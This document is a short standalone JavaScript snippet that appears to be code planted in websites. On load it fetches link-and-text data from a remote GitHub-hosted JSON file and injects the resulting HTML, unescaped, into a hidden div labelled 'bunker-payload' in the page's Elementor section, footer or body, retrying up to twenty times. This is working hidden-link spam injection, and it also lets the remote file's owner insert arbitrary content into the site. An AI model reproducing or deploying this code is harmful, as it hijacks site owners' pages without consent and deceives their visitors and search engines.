(function () {

  const TEKS_URL = "https://cdn.jsdelivr.net/gh/nanangkus/jsload@refs/heads/main/teks.json";
  const MAX_TRY = 20;
  let attempt = 0;

  function createArticle(data) {
    let html = "";

    data.articles.forEach(item => {
      const anchorText = Array.isArray(item.anchor)
        ? item.anchor[Math.floor(Math.random() * item.anchor.length)]
        : item.anchor;

      html += item.text;

      if (item.link && anchorText) {
        html += ' <a href="' + item.link + '" target="_blank">' + anchorText + '</a>';
      }

      html += "<br>";
    });

    return html;
  }

  function inject(html) {
    if (document.getElementById("bunker-payload")) return;

    const div = document.createElement("div");
    div.id = "bunker-payload";
    div.style.display = "none";
    div.innerHTML = html;

    const target =
      document.querySelector(".elementor") ||
      document.querySelector("footer") ||
      document.body;

    if (!target) return false;

    target.appendChild(div);
    return true;
  }

  function tryInject() {
    fetch(TEKS_URL)
      .then(r => r.json())
      .then(json => {
        if (inject(createArticle(json))) return;
        if (++attempt < MAX_TRY) setTimeout(tryInject, 500);
      })
      .catch(() => {
        if (++attempt < MAX_TRY) setTimeout(tryInject, 500);
      });
  }

  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", tryInject);
  } else {
    tryInject();
  }

})();
